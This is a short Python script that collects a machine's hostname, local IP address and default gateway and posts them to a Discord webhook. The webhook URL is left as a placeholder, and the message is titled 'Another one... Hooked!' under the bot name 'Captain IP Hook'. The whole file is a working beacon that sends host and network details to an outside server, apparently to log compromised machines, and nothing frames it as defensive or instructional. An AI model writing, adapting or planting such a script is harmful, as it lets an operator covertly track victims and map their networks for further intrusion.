import socket
import subprocess
import requests

webhookURL = 'your-discord-webhook'

# Get IP address, gateway and hostname
process = subprocess.Popen(['ip', '-4', 'route', 'show', 'default'], stdout=subprocess.PIPE)
output, error = process.communicate()
gw = output.split()[2].decode()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((gw, 0))
ipaddr = s.getsockname()[0]
gateway = gw
host = socket.gethostname()

# Send webhook message with purple color
data = {
    'username': 'Captain IP Hook',
    'embeds': [{
        'color': 0xB57EDC,  # Purple color
        'title': 'Another one... Hooked!',
        'description': f'**hostname: **{host}\n**IP: **{ipaddr}\n**Gateway: **{gateway}',
    }]
}

try:
    result = requests.post(webhookURL, json=data)
    result.raise_for_status()
except requests.exceptions.RequestException as e:
    print(f'Error sending webhook message: {e}')
